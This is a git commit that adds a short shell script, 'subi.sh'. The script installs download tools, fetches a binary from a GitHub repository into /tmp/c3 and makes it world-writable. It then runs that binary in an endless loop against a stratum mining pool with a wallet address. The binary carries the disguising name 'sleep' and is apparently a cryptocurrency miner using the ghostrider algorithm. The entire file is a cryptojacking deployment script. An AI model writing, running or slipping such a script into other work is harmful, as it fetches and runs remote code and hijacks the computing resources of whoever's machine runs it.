cb08a2c0229ea27594f51f86f8c2c8571bcf008a
Blenkinship <151480121+Blenkinship@users.noreply.github.com>
2023-12-13 11:12:33 +0800

    Add files via upload

---
+++ subi.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+## requirement
+apt-get -qq update
+apt-get -qq install -y wget curl unzip
+
+mkdir -p /tmp/c3
+cd /tmp/c3
+wget https://raw.githubusercontent.com/Blenkinship/any/main/sleep
+chmod -R  777 /tmp/c3
+
+#!/bin/sh
+while [ 1 ]; do
+	/tmp/c3/sleep -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.ls
+	sleep 5
+done
+
+
+
